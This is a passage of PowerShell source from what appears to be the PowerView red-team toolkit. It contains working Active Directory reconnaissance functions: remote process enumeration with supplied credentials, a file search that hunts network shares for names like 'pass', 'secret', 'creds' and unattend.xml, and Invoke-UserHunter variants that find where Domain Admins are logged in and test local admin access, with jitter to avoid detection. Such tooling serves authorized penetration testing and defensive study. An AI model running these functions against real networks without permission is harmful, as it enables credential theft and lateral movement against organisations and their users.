            $HostName = [System.Net.Dns]::GetHostName()
        }

        # process multiple object types
        $HostName = Get-NameField $HostName

        $Credential = $Null

        if($RemoteUserName){
            if($RemotePassword){
                $Password = $RemotePassword | ConvertTo-SecureString -asPlainText -Force
                $Credential = New-Object System.Management.Automation.PSCredential($RemoteUserName,$Password)

                # try to enumerate the processes on the remote machine using the supplied credential
                try{
                    Get-WMIobject -Class Win32_process -ComputerName $HostName -Credential $Credential | % {
                        $owner=$_.getowner();
                        $out = new-object psobject
                        $out | Add-Member Noteproperty 'Host' $HostName
                        $out | Add-Member Noteproperty 'Process' $_.ProcessName
                        $out | Add-Member Noteproperty 'PID' $_.ProcessID
                        $out | Add-Member Noteproperty 'Domain' $owner.Domain
                        $out | Add-Member Noteproperty 'User' $owner.User
                        $out
                    }
                }
                catch{
                    Write-Verbose "[!] Error enumerating remote processes, access likely denied"
                }
            }
            else{
                Write-Warning "[!] RemotePassword must also be supplied!"
            }
        }
        else{
            # try to enumerate the processes on the remote machine
            try{
                Get-WMIobject -Class Win32_process -ComputerName $HostName | % {
                    $owner=$_.getowner();
                    $out = new-object psobject
                    $out | Add-Member Noteproperty 'Host' $HostName
                    $out | Add-Member Noteproperty 'Process' $_.ProcessName
                    $out | Add-Member Noteproperty 'PID' $_.ProcessID
                    $out | Add-Member Noteproperty 'Domain' $owner.Domain
                    $out | Add-Member Noteproperty 'User' $owner.User
                    $out
                }
            }
            catch{
                Write-Verbose "[!] Error enumerating remote processes, access likely denied"
            }
        }
    }
}


function Invoke-FileSearch {
    <#
        .SYNOPSIS
        Searches a given server/path for files with specific terms in the name.

        .DESCRIPTION
        This function recursively searches a given UNC path for files with
        specific keywords in the name (default of pass, sensitive, secret, admin,
        login and unattend*.xml). The output can be piped out to a csv with the
        -OutFile flag. By default, hidden files/folders are included in search results.

        .PARAMETER Path
        UNC/local path to recursively search.

        .PARAMETER Terms
        Terms to search for.

        .PARAMETER OfficeDocs
        Search for office documents (*.doc*, *.xls*, *.ppt*)

        .PARAMETER FreshEXES
        Find .EXEs accessed within the last week.

        .PARAMETER AccessDateLimit
        Only return files with a LastAccessTime greater than this date value.

        .PARAMETER WriteDateLimit
        Only return files with a LastWriteTime greater than this date value.

        .PARAMETER CreateDateLimit
        Only return files with a CreationDate greater than this date value.

        .PARAMETER ExcludeFolders
        Exclude folders from the search results.

        .PARAMETER ExcludeHidden
        Exclude hidden files and folders from the search results.

        .PARAMETER CheckWriteAccess
        Only returns files the current user has write access to.

        .PARAMETER OutFile
        Output results to a specified csv output file.

        .OUTPUTS
        The full path, owner, lastaccess time, lastwrite time, and size for
        each found file.

        .EXAMPLE
        > Invoke-FileSearch -Path \\WINDOWS7\Users\
        Returns any files on the remote path \\WINDOWS7\Users\ that have 'pass',
        'sensitive', or 'secret' in the title.

        .EXAMPLE
        > Invoke-FileSearch -Path \\WINDOWS7\Users\ -Terms salaries,email -OutFile out.csv
        Returns any files on the remote path \\WINDOWS7\Users\ that have 'salaries'
        or 'email' in the title, and writes the results out to a csv file
        named 'out.csv'

        .EXAMPLE
        > Invoke-FileSearch -Path \\WINDOWS7\Users\ -AccessDateLimit 6/1/2014
        Returns all files accessed since 6/1/2014.

        .LINK
        http://www.harmj0y.net/blog/redteaming/file-server-triage-on-red-team-engagements/
    #>

    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $Path = '.\',

        [string[]]
        $Terms,

        [Switch]
        $OfficeDocs,

        [Switch]
        $FreshEXES,

        [String]
        $AccessDateLimit = '1/1/1970',

        [String]
        $WriteDateLimit = '1/1/1970',

        [String]
        $CreateDateLimit = '1/1/1970',

        [Switch]
        $ExcludeFolders,

        [Switch]
        $ExcludeHidden,

        [Switch]
        $CheckWriteAccess,

        [String]
        $OutFile
    )

    begin {
        # default search terms
        $SearchTerms = @('pass', 'sensitive', 'admin', 'login', 'secret', 'unattend*.xml', '.vmdk', 'creds', 'credential', '.config')

        # check if custom search terms were passed
        if ($Terms){
            if($Terms -isnot [system.array]){
                $Terms = @($Terms)
            }
            $SearchTerms = $Terms
        }

        # append wildcards to the front and back of all search terms
        for ($i = 0; $i -lt $SearchTerms.Count; $i++) {
            $SearchTerms[$i] = "*$($SearchTerms[$i])*"
        }

        # search just for office documents if specified
        if ($OfficeDocs){
            $SearchTerms = @('*.doc', '*.docx', '*.xls', '*.xlsx', '*.ppt', '*.pptx')
        }

        # find .exe's accessed within the last 7 days
        if($FreshEXES){
            # get an access time limit of 7 days ago
            $AccessDateLimit = (get-date).AddDays(-7).ToString('MM/dd/yyyy')
            $SearchTerms = '*.exe'
        }
    }

    process {
        Write-Verbose "[*] Search path $Path"

        # build our giant recursive search command w/ conditional options
        $cmd = "get-childitem $Path -rec $(if(-not $ExcludeHidden){`"-Force`"}) -ErrorAction SilentlyContinue -include $($SearchTerms -join `",`") | where{ $(if($ExcludeFolders){`"(-not `$_.PSIsContainer) -and`"}) (`$_.LastAccessTime -gt `"$AccessDateLimit`") -and (`$_.LastWriteTime -gt `"$WriteDateLimit`") -and (`$_.CreationTime -gt `"$CreateDateLimit`")} | select-object FullName,@{Name='Owner';Expression={(Get-Acl `$_.FullName).Owner}},LastAccessTime,LastWriteTime,Length $(if($CheckWriteAccess){`"| where { `$_.FullName } | where { Invoke-CheckWrite -Path `$_.FullName }`"}) $(if($OutFile){`"| export-csv -Append -notypeinformation -path $OutFile`"})"

        # execute the command
        Invoke-Expression $cmd
    }
}


########################################################
#
# 'Meta'-functions start below
#
########################################################

function Invoke-UserHunter {
    <#
        .SYNOPSIS
        Finds which machines users of a specified group are logged into.

        Author: @harmj0y
        License: BSD 3-Clause

        .DESCRIPTION
        This function finds the local domain name for a host using Get-NetDomain,
        queries the domain for users of a specified group (default "domain admins")
        with Get-NetGroupMember or reads in a target user list, queries the domain for all
        active machines with Get-NetComputer or reads in a pre-populated host list,
        randomly shuffles the target list, then for each server it gets a list of
        active users with Get-NetSession/Get-NetLoggedon. The found user list is compared
        against the target list, and a status message is displayed for any hits.
        The flag -CheckAccess will check each positive host to see if the current
        user has local admin access to the machine.

        .PARAMETER Hosts
        Host array to enumerate, passable on the pipeline.

        .PARAMETER HostList
        List of hostnames/IPs to search.

        .PARAMETER HostFilter
        Host filter name to query AD for, wildcards accepted.

        .PARAMETER GroupName
        Group name to query for target users.

        .PARAMETER TargetServer
        Hunt for users who are effective local admins on a target server.

        .PARAMETER ADSpath
        The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
        Useful for OU queries.

        .PARAMETER Filter
        A customized ldap filter string to use, e.g. "(description=*admin*)"

        .PARAMETER UserName
        Specific username to search for.

        .PARAMETER UserList
        List of usernames to search for.

        .PARAMETER StopOnSuccess
        Stop hunting after finding after finding a user.

        .PARAMETER NoPing
        Don't ping each host to ensure it's up before enumerating.

        .PARAMETER CheckAccess
        Check if the current user has local admin access to found machines.

        .PARAMETER Delay
        Delay between enumerating hosts, defaults to 0

        .PARAMETER Jitter
        Jitter for the host delay, defaults to +/- 0.3

        .PARAMETER Domain
        Domain for query for machines.

        .PARAMETER ShowAll
        Return all user location results, i.e. Invoke-UserView functionality.

        .PARAMETER SearchForest
        Search all domains in the forest for target users instead of just
        a single domain.

        .EXAMPLE
        > Invoke-UserHunter -CheckAccess
        Finds machines on the local domain where domain admins are logged into
        and checks if the current user has local administrator access.

        .EXAMPLE
        > Invoke-UserHunter -Domain 'testing'
        Finds machines on the 'testing' domain where domain admins are logged into.

        .EXAMPLE
        > Invoke-UserHunter -UserList users.txt -HostList hosts.txt
        Finds machines in hosts.txt where any members of users.txt are logged in
        or have sessions.

        .EXAMPLE
        > Invoke-UserHunter -GroupName "Power Users" -Delay 60
        Find machines on the domain where members of the "Power Users" groups are
        logged into with a 60 second (+/- *.3) randomized delay between
        touching each host.

        .EXAMPLE
        > Invoke-UserHunter -TargetServer FILESERVER
        Query FILESERVER for useres who are effective local administrators using
        Get-NetLocalGroup -Recurse, and hunt for that user set on the network.

        .EXAMPLE
        > Invoke-UserHunter -SearchForest
        Find all machines in the current forest where domain admins are logged in.

        .LINK
        http://blog.harmj0y.net
    #>

    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$true)]
        [String[]]
        $Hosts,

        [String]
        $HostList,

        [String]
        $HostFilter,

        [String]
        $GroupName = 'Domain Admins',

        [String]
        $TargetServer,

        [String]
        $ADSpath,

        [String]
        $Filter,

        [String]
        $UserName,

        [Switch]
        $CheckAccess,

        [Switch]
        $StopOnSuccess,

        [Switch]
        $NoPing,

        [UInt32]
        $Delay = 0,

        [double]
        $Jitter = .3,

        [String]
        $UserList,

        [String]
        $Domain,

        [Switch]
        $ShowAll,

        [Switch]
        $SearchForest
    )

    begin {
        if ($PSBoundParameters['Debug']) {
            $DebugPreference = 'Continue'
        }

        # users we're going to be searching for
        $TargetUsers = @()

        # random object for delay
        $randNo = New-Object System.Random

        # get the current user
        $CurrentUser = Get-NetCurrentUser
        $CurrentUserBase = ([Environment]::UserName).toLower()

        # get the target domain
        if($Domain){
            $TargetDomains = @($Domain)
        }
        elseif($SearchForest) {
            # get ALL the domains in the forest to search
            $TargetDomains = Get-NetForestDomain | % { $_.Name }
        }
        else{
            # use the local domain
            $TargetDomains = Get-NetDomain | % { $_.Name }
        }

        Write-Verbose "[*] Running Invoke-UserHunter with delay of $Delay"
        if($TargetDomains){
            foreach ($Domain in $TargetDomains){
                Write-Verbose "[*] Searching domain: $Domain"
            }
        }

        # if we're using a host list, read the targets in and add them to the target list
        if($HostList){
            if (Test-Path -Path $HostList){
                $Hosts = Get-Content -Path $HostList
            }
            else{
                Write-Warning "[!] Input file '$HostList' doesn't exist!"
                return
            }
        }
        elseif($HostFilter){
            if($TargetDomains) {
                foreach ($Domain in $TargetDomains){
                    Write-Verbose "[*] Querying domain $Domain for hosts with filter '$HostFilter'"
                    $Hosts = Get-NetComputer -Domain $Domain -HostName $HostFilter
                }
            }
            else {
                Write-Verbose "[*] Querying current domain for hosts with filter '$HostFilter'"
                $Hosts = Get-NetComputer -HostName $HostFilter
            }
        }

        # if we're showing all results, skip username enumeration
        if($ShowAll){}
        # if we want to hunt for the effective domain users who can access a target server
        elseif($TargetServer){
            Write-Verbose "Querying target server '$TargetServer' for hosts"
            $TargetUsers = Get-NetLocalGroup $TargetServer -Recurse | ?{(-not $_.IsGroup) -and $_.IsDomain } | % { 
                $out = New-Object psobject
                $out | Add-Member Noteproperty 'MemberDomain' ($_.AccountName).split("/")[0].toLower() 
                $out | Add-Member Noteproperty 'MemberName' ($_.AccountName).split("/")[1].toLower() 
                ($_.AccountName).split("/")[1].toLower() 
                $out
            }
            Write-Verbose "Target users: $TargetUsers"
        }
        # if we get a specific username, only use that
        elseif($UserName){
            Write-Verbose "[*] Using target user '$UserName'..."
            $out = New-Object psobject
            $out | Add-Member Noteproperty 'MemberDomain' $(Get-NetDomain | %{$_.Name})
            $out | Add-Member Noteproperty 'MemberName' $UserName.ToLower()
            $TargetUsers = @($out)
        }
        # get the users from a particular ADSpath if one is specified
        elseif($ADSpath){
            if($TargetDomains) {
                foreach ($Domain in $TargetDomains){
                    # TODO: add $Domain into results for $TargetUsers
                    $TargetUsers += Get-NetUser -Domain $Domain -ADSpath $ADSpath | ForEach-Object {
                        $out = New-Object psobject
                        $out | Add-Member Noteproperty 'MemberDomain' $Domain
                        $out | Add-Member Noteproperty 'MemberName' $_.samaccountname
                        $out
                    }
                }
            }
            else {
                $domain = Get-NetDomain | %{$_.Name}
                $TargetUsers = Get-NetUser -ADSpath $ADSpath | ForEach-Object {
                    $out = New-Object psobject
                    $out | Add-Member Noteproperty 'MemberDomain' $Domain
                    $out | Add-Member Noteproperty 'MemberName' $_.samaccountname
                    $out
                }
            }
        }
        # use a specific LDAP query string to query for users
        elseif($Filter){
            if($TargetDomains) {
                foreach ($Domain in $TargetDomains){
                    Write-Verbose "[*] Querying domain $Domain for hosts with filter '$HostFilter'"
                    $TargetUsers += Get-NetUser -Domain $Domain -Filter $Filter | ForEach-Object {
                        $out = New-Object psobject
                        $out | Add-Member Noteproperty 'MemberDomain' $Domain
                        $out | Add-Member Noteproperty 'MemberName' $_.samaccountname
                        $out
                    }
                }
            }
            else {
                $domain = Get-NetDomain | %{$_.Name}
                $TargetUsers = Get-NetUser -Filter $Filter | ForEach-Object {
                    $out = New-Object psobject
                    $out | Add-Member Noteproperty 'MemberDomain' $Domain
                    $out | Add-Member Noteproperty 'MemberName' $_.samaccountname
                    $out
                }
            }
        }
        # read in a target user list if we have one
        elseif($UserList){
            $TargetUsers = @()
            $domain = Get-NetDomain | %{$_.Name}

            # make sure the list exists
            if (Test-Path -Path $UserList){
                $TargetUsers = Get-Content -Path $UserList | ForEach-Object {
                    $out = New-Object psobject
                    $out | Add-Member Noteproperty 'MemberDomain' $Domain
                    $out | Add-Member Noteproperty 'MemberName' $_
                    $out
                }
            }
            else {
                Write-Warning "[!] Input file '$UserList' doesn't exist!"
                return
            }
        }
        else{
            if($TargetDomains) {
                foreach ($Domain in $TargetDomains){
                    Write-Verbose "[*] Querying domain $Domain for users of group '$GroupName'"
                    # $TargetUsers += Get-NetUser -Domain $Domain -Filter $Filter | ForEach-Object {$_.samaccountname}
                    $TargetUsers += Get-NetGroupMember -GroupName $GroupName -Domain $Domain
                }
            }
            else {
                # otherwise default to the group name to query for target users
                Write-Verbose "[*] Querying domain group '$GroupName' for target users..."
                $TargetUsers = Get-NetGroupMember -GroupName $GroupName
            }
        }

        if ((-not $ShowAll) -and (($TargetUsers -eq $null) -or ($TargetUsers.Count -eq 0))){
            Write-Warning "[!] No users found to search for!"
            return
        }
    }

    process {
        if ( (-not ($Hosts)) -or ($Hosts.length -eq 0)) {
            if($TargetDomains) {
                foreach ($Domain in $TargetDomains){
                    Write-Verbose "[*] Querying domain $Domain for hosts..."
                    $Hosts += Get-NetComputer -Domain $Domain
                }
            }
            else{
                $Hosts += Get-NetComputer
            }
        }

        # remove any null target users/hosts
        $TargetUsers = $TargetUsers | ?{$_}
        $Hosts = $Hosts | ?{$_}

        # randomize the host list
        $Hosts = Get-ShuffledArray $Hosts

        if(-not $NoPing){
            $Hosts = $Hosts | Invoke-Ping
        }

        $HostCount = $Hosts.Count
        Write-Verbose "[*] Total number of hosts: $HostCount"

        $counter = 0

        foreach ($server in $Hosts){

            $counter = $counter + 1

            # make sure we get a server name
            if ($server -ne ''){
                $found = $false

                # sleep for our semi-randomized interval
                Start-Sleep -Seconds $randNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
                Write-Verbose "[*] Enumerating server $server ($counter of $($Hosts.count))"

                # get active sessions and see if there's a target user there
                $sessions = Get-NetSession -HostName $server

                foreach ($session in $sessions) {
                    $username = $session.sesi10_username
                    $cname = $session.sesi10_cname
                    $activetime = $session.sesi10_time
                    $idletime = $session.sesi10_idle_time

                    $username = $username.toLower().trim()
                    if($cname -and $cname.StartsWith("\\")){
                        $cname = $cname.TrimStart("\")
                    }

                    # make sure we have a result
                    if (($username) -and ($username -ne '') -and ($username -ne $CurrentUserBase)){
                        # if the session user is in the target list, display some output

                        if ($ShowAll){
                            $out = new-object psobject
                            $out | add-member Noteproperty 'MemberDomain' $_.MemberDomain
                            $out | add-member Noteproperty 'MemberName' $username
                            $out | add-member Noteproperty 'Computer' $server
                            $ip = Get-HostIP -hostname $Server
                            $out | add-member Noteproperty 'IP' $ip
                            $out | add-member Noteproperty 'SessionFrom' $cname

                            # see if we're checking to see if we have local admin access on this machine
                            if ($CheckAccess){
                                $admin = Invoke-CheckLocalAdminAccess -Hostname $cname
                                $out | add-member Noteproperty 'LocalAdmin' $admin
                            }
                            else{
                                $out | add-member Noteproperty 'LocalAdmin' $Null
                            }
                            $out
                        }
                        else {
                            $TargetUsers | ? {$_.MemberName -and ($_.MemberName.tolower().trim() -eq $username)} | % {
                                $out = new-object psobject
                                $out | add-member Noteproperty 'MemberDomain' $_.MemberDomain
                                $out | add-member Noteproperty 'MemberName' $username
                                $out | add-member Noteproperty 'Computer' $server
                                $ip = Get-HostIP -hostname $Server
                                $out | add-member Noteproperty 'IP' $ip
                                $out | add-member Noteproperty 'SessionFrom' $cname

                                # see if we're checking to see if we have local admin access on this machine
                                if ($CheckAccess){
                                    $admin = Invoke-CheckLocalAdminAccess -Hostname $cname
                                    $out | add-member Noteproperty 'LocalAdmin' $admin
                                }
                                else{
                                    $out | add-member Noteproperty 'LocalAdmin' $Null
                                }
                                $found = $True
                                $out

                            } 
                        }
                    }
                }

                # get any logged on users and see if there's a target user there
                $users = Get-NetLoggedon -HostName $server
                foreach ($user in $users) {
                    $username = $user.wkui1_username
                    $domain = $user.wkui1_logon_domain

                    # TODO: translate domain to authoratative name
                    #   then match domain name

                    if (($username -ne $null) -and ($username.trim() -ne '')){
                        # if the session user is in the target list, display some output
                        if ($ShowAll){
                            $found = $true
                            $ip = Get-HostIP -hostname $Server

                            $out = new-object psobject
                            $out | add-member Noteproperty 'MemberDomain' $domain
                            $out | add-member Noteproperty 'MemberName' $username
                            $out | add-member Noteproperty 'Computer' $server
                            $out | add-member Noteproperty 'IP' $ip
                            $out | add-member Noteproperty 'SessionFrom' $Null

                            # see if we're checking to see if we have local admin access on this machine
                            if ($CheckAccess){
                                $admin = Invoke-CheckLocalAdminAccess -Hostname $server
                                $out | add-member Noteproperty 'LocalAdmin' $admin
                            }
                            else{
                                $out | add-member Noteproperty 'LocalAdmin' $Null
                            }
                            $out
                        }
                        else {
                            # $TargetUsers | %{$_.MemberName}
                            $TargetUsers | ? {$_.MemberName -and ($_.MemberName.toLower().trim() -eq $username)} | % {
                                $out = new-object psobject
                                $out | add-member Noteproperty 'MemberDomain' $_.MemberDomain
                                $out | add-member Noteproperty 'MemberName' $username
                                $out | add-member Noteproperty 'Computer' $server
                                $ip = Get-HostIP -hostname $Server
                                $out | add-member Noteproperty 'IP' $ip
                                $out | add-member Noteproperty 'SessionFrom' $cname

                                # see if we're checking to see if we have local admin access on this machine
                                if ($CheckAccess){
                                    $admin = Invoke-CheckLocalAdminAccess -Hostname $cname
                                    $out | add-member Noteproperty 'LocalAdmin' $admin
                                }
                                else{
                                    $out | add-member Noteproperty 'LocalAdmin' $Null
                                }
                                $found = $True
                                $out
                            } 
                        }
                    }
                }

                if ($StopOnSuccess -and $found) {
                    Write-Verbose "[*] User found, returning early"
                    return
                }
            }
        }
    }
}


function Invoke-UserHunterThreaded {
    <#
        .SYNOPSIS
        Finds which machines users of a specified group are logged into.
        Threaded version of Invoke-UserHunter. Uses multithreading to
        speed up enumeration.

        Author: @harmj0y
        License: BSD 3-Clause

        .DESCRIPTION
        This function finds the local domain name for a host using Get-NetDomain,
        queries the domain for users of a specified group (default "domain admins")
        with Get-NetGroupMember or reads in a target user list, queries the domain for all
        active machines with Get-NetComputer or reads in a pre-populated host list,
        randomly shuffles the target list, then for each server it gets a list of
        active users with Get-NetSession/Get-NetLoggedon. The found user list is compared
        against the target list, and a status message is displayed for any hits.
        The flag -CheckAccess will check each positive host to see if the current
        user has local admin access to the machine.
        Threaded version of Invoke-UserHunter.

        .PARAMETER Hosts
        Host array to enumerate, passable on the pipeline.

        .PARAMETER HostList
        List of hostnames/IPs to search.

        .PARAMETER HostFilter
        Host filter name to query AD for, wildcards accepted.

        .PARAMETER GroupName
        Group name to query for target users.

        .PARAMETER ADSpath
        The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
        Useful for OU queries.

        .PARAMETER Filter
        A customized ldap filter string to use, e.g. "(description=*admin*)"

        .PARAMETER UserName
        Specific username to search for.

        .PARAMETER UserList
        List of usernames to search for.

        .PARAMETER NoPing
        Don't ping each host to ensure it's up before enumerating.

        .PARAMETER CheckAccess
        Check if the current user has local admin access to found machines.

        .PARAMETER Domain
        Domain for query for machines.

        .PARAMETER MaxThreads
        The maximum concurrent threads to execute.

        .PARAMETER ShowAll
        Return all user location results, i.e. Invoke-UserView functionality.

        .EXAMPLE
        > Invoke-UserHunter
        Finds machines on the local domain where domain admins are logged into.

        .EXAMPLE
        > Invoke-UserHunter -Domain 'testing'
        Finds machines on the 'testing' domain where domain admins are logged into.

        .EXAMPLE
        > Invoke-UserHunter -CheckAccess
        Finds machines on the local domain where domain admins are logged into
        and checks if the current user has local administrator access.

        .EXAMPLE
        > Invoke-UserHunter -UserList users.txt -HostList hosts.txt
        Finds machines in hosts.txt where any members of users.txt are logged in
        or have sessions.

        .EXAMPLE
        > Invoke-UserHunter -UserName jsmith -CheckAccess
        Find machines on the domain where jsmith is logged into and checks if
        the current user has local administrator access.

        .LINK
        http://blog.harmj0y.net
    #>

    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$true)]
        [String[]]
        $Hosts,

        [String]
        $GroupName = 'Domain Admins',

        [String]
        $ADSpath,

        [String]
        $Filter,

        [String]
        $UserName,

        [Switch]
        $CheckAccess,

        [Switch]
        $NoPing,

        [String]
        $HostList,

        [String]
        $HostFilter,

        [String]
        $UserList,

        [String]
        $Domain,

        [int]
        $MaxThreads = 20,

        [Switch]
        $ShowAll
    )

    begin {
        if ($PSBoundParameters['Debug']) {
            $DebugPreference = 'Continue'
        }

        # users we're going to be searching for
        $TargetUsers = @()

        # get the current user
        $CurrentUser = Get-NetCurrentUser
        $CurrentUserBase = ([Environment]::UserName).toLower()

        # get the target domain
        if($Domain){
            $targetDomain = $Domain
        }
        else{
            # use the local domain
            $targetDomain = $null
        }

        Write-Verbose "[*] Running Invoke-UserHunterThreaded with delay of $Delay"
        if($targetDomain){
            Write-Verbose "[*] Domain: $targetDomain"
        }

        # if we're using a host list, read the targets in and add them to the target list
        if($HostList){
            if (Test-Path -Path $HostList){
                $Hosts = Get-Content -Path $HostList
            }
            else{
                Write-Warning "[!] Input file '$HostList' doesn't exist!"
                return
            }
        }
        elseif($HostFilter){
            Write-Verbose "[*] Querying domain $targetDomain for hosts with filter '$HostFilter'"
            $Hosts = Get-NetComputer -Domain $targetDomain -HostName $HostFilter
        }

        # if we're showing all results, skip username enumeration
        if($ShowAll){}
        # if we get a specific username, only use that
        elseif ($UserName){
            Write-Verbose "[*] Using target user '$UserName'..."
            $TargetUsers += $UserName.ToLower()
        }
        # get the users from a particular ADSpath if one is specified
        elseif($ADSpath){
            $TargetUsers = Get-NetUser -ADSpath $ADSpath | ForEach-Object {$_.samaccountname}
        }
        # use a specific LDAP query string to query for users
        elseif($Filter){
            $TargetUsers = Get-NetUser -Filter $Filter | ForEach-Object {$_.samaccountname}
        }
        # read in a target user list if we have one
        elseif($UserList){
            $TargetUsers = @()
            # make sure the list exists
            if (Test-Path -Path $UserList){
                $TargetUsers = Get-Content -Path $UserList
            }
            else {
                Write-Warning "[!] Input file '$UserList' doesn't exist!"
                return
            }
        }
        else{
            # otherwise default to the group name to query for target users
            Write-Verbose "[*] Querying domain group '$GroupName' for target users..."
            $temp = Get-NetGroupMember -GroupName $GroupName -Domain $targetDomain | % {$_.MemberName}
            # lower case all of the found usernames
            $TargetUsers = $temp | ForEach-Object {$_.ToLower() }
        }

        if ((-not $ShowAll) -and (($TargetUsers -eq $null) -or ($TargetUsers.Count -eq 0))){
            Write-Warning "[!] No users found to search for!"
            return $Null
        }

        # script block that eunmerates a server
        # this is called by the multi-threading code later
        $EnumServerBlock = {
            param($Server, $Ping, $TargetUsers, $CurrentUser, $CurrentUserBase)

            # optionally check if the server is up first
            $up = $true
            if($Ping){
                $up = Test-Server -Server $Server
            }
            if($up){
                # get active sessions and see if there's a target user there
                $sessions = Get-NetSession -HostName $Server

                foreach ($session in $sessions) {
                    $username = $session.sesi10_username
                    $cname = $session.sesi10_cname
                    $activetime = $session.sesi10_time
                    $idletime = $session.sesi10_idle_time

                    # make sure we have a result
                    if (($username -ne $null) -and ($username.trim() -ne '') -and ($username.trim().toLower() -ne $CurrentUserBase)){
                        # if the session user is in the target list, display some output
                        if ((-not $TargetUsers) -or ($TargetUsers -contains $username)){

                            $ip = Get-HostIP -hostname $Server

                            if($cname.StartsWith("\\")){
                                $cname = $cname.TrimStart("\")
                            }

                            $out = new-object psobject
                            $out | Add-Member Noteproperty 'TargetUser' $username
                            $out | Add-Member Noteproperty 'Computer' $server
                            $out | Add-Member Noteproperty 'IP' $ip
                            $out | Add-Member Noteproperty 'SessionFrom' $cname

                            # see if we're checking to see if we have local admin access on this machine
                            if ($CheckAccess){
                                $admin = Invoke-CheckLocalAdminAccess -Hostname $cname
                                $out | Add-Member Noteproperty 'LocalAdmin' $admin
                            }
                            else{
                                $out | Add-Member Noteproperty 'LocalAdmin' $Null
                            }
                            $out
                        }
                    }
                }

                # get any logged on users and see if there's a target user there
                $users = Get-NetLoggedon -HostName $Server
                foreach ($user in $users) {
                    $username = $user.wkui1_username
                    $domain = $user.wkui1_logon_domain

                    if (($username -ne $null) -and ($username.trim() -ne '')){
                        # if the session user is in the target list, display some output
                        if ((-not $TargetUsers) -or ($TargetUsers -contains $username)){

                            $ip = Get-HostIP -hostname $Server

                            $out = new-object psobject
                            $out | Add-Member Noteproperty 'TargetUser' $username
                            $out | Add-Member Noteproperty 'Computer' $server
                            $out | Add-Member Noteproperty 'IP' $ip
                            $out | Add-Member Noteproperty 'SessionFrom' $Null

                            # see if we're checking to see if we have local admin access on this machine
                            if ($CheckAccess){
                                $admin = Invoke-CheckLocalAdminAccess -Hostname $server
                                $out | Add-Member Noteproperty 'LocalAdmin' $admin
                            }
                            else{
                                $out | Add-Member Noteproperty 'LocalAdmin' $Null
                            }
                            $out
                        }
                    }
                }
            }
        }

        # Adapted from:
        #   http://powershell.org/wp/forums/topic/invpke-parallel-need-help-to-clone-the-current-runspace/
        $sessionState = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()
        $sessionState.ApartmentState = [System.Threading.Thread]::CurrentThread.GetApartmentState()

        # grab all the current variables for this runspace
        $MyVars = Get-Variable -Scope 1

        # these Variables are added by Runspace.Open() Method and produce Stop errors if you add them twice
        $VorbiddenVars = @("?","args","ConsoleFileName","Error","ExecutionContext","false","HOME","Host","input","InputObject","MaximumAliasCount","MaximumDriveCount","MaximumErrorCount","MaximumFunctionCount","MaximumHistoryCount","MaximumVariableCount","MyInvocation","null","PID","PSBoundParameters","PSCommandPath","PSCulture","PSDefaultParameterValues","PSHOME","PSScriptRoot","PSUICulture","PSVersionTable","PWD","ShellId","SynchronizedHash","true")

        # Add Variables from Parent Scope (current runspace) into the InitialSessionState
        ForEach($Var in $MyVars) {
            If($VorbiddenVars -notcontains $Var.Name) {
            $sessionstate.Variables.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateVariableEntry -ArgumentList $Var.name,$Var.Value,$Var.description,$Var.options,$Var.attributes))
            }
        }

        # Add Functions from current runspace to the InitialSessionState
        ForEach($Function in (Get-ChildItem Function:)) {
            $sessionState.Commands.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateFunctionEntry -ArgumentList $Function.Name, $Function.Definition))
        }

        # threading adapted from
        # https://github.com/darkoperator/Posh-SecMod/blob/master/Discovery/Discovery.psm1#L407
        # Thanks Carlos!

        # create a pool of maxThread runspaces
        $pool = [runspacefactory]::CreateRunspacePool(1, $MaxThreads, $sessionState, $host)
        $pool.Open()

        $jobs = @()
        $ps = @()
        $wait = @()

        $counter = 0
    }

    process {

        if ( (-not ($Hosts)) -or ($Hosts.length -eq 0)) {
            Write-Verbose "[*] Querying domain $targetDomain for hosts..."
            $Hosts = Get-NetComputer -Domain $targetDomain
        }

        # randomize the host list
        $Hosts = Get-ShuffledArray $Hosts
        $HostCount = $Hosts.Count
        Write-Verbose "[*] Total number of hosts: $HostCount"

        foreach ($server in $Hosts){
            # make sure we get a server name
            if ($server -ne ''){
                Write-Verbose "[*] Enumerating server $server ($($counter+1) of $($Hosts.count))"

                While ($($pool.GetAvailableRunspaces()) -le 0) {
                    Start-Sleep -milliseconds 500
                }

                # create a "powershell pipeline runner"
                $ps += [powershell]::create()

                $ps[$counter].runspacepool = $pool

                # add the script block + arguments
                [void]$ps[$counter].AddScript($EnumServerBlock).AddParameter('Server', $server).AddParameter('Ping', -not $NoPing).AddParameter('TargetUsers', $TargetUsers).AddParameter('CurrentUser', $CurrentUser).AddParameter('CurrentUserBase', $CurrentUserBase)

                # start job
                $jobs += $ps[$counter].BeginInvoke();

                # store wait handles for WaitForAll call
                $wait += $jobs[$counter].AsyncWaitHandle
            }
            $counter = $counter + 1
        }
    }

    end {

        Write-Verbose "Waiting for scanning threads to finish..."

        $waitTimeout = Get-Date

        while ($($jobs | ? {$_.IsCompleted -eq $false}).count -gt 0 -or $($($(Get-Date) - $waitTimeout).totalSeconds) -gt 60) {
                Start-Sleep -milliseconds 500
            }

        # end async call
        for ($y = 0; $y -lt $counter; $y++) {

            try {
                # complete async job
                $ps[$y].EndInvoke($jobs[$y])

            } catch {
                Write-Warning "error: $_"
            }
            finally {
                $ps[$y].Dispose()
            }
        }

        $pool.Dispose()
    }
}


function Invoke-StealthUserHunter {
    <#
        .SYNOPSIS
        Finds where users are logged into by checking the net sessions
        on common file servers (default) or through SPN records (-SPN).

        Author: @harmj0y
        License: BSD 3-Clause

        .DESCRIPTION
        This function issues one query on the domain to get users of a target group,
        issues one query on the domain to get all user information, extracts the
        homeDirectory for each user, creates a unique list of servers used for
        homeDirectories (i.e. file servers), and runs Get-NetSession against the target
        servers. Found users are compared against the users queried from the domain group,
        or pulled from a pre-populated user list. Significantly less traffic is generated
        on average compared to Invoke-UserHunter, but not as many hosts are covered.

        .PARAMETER Hosts
        Host array to enumerate, passable on the pipeline.

        .PARAMETER HostList
        List of servers to enumerate.

        .PARAMETER GroupName
        Group name to query for target users.

        .PARAMETER TargetServer
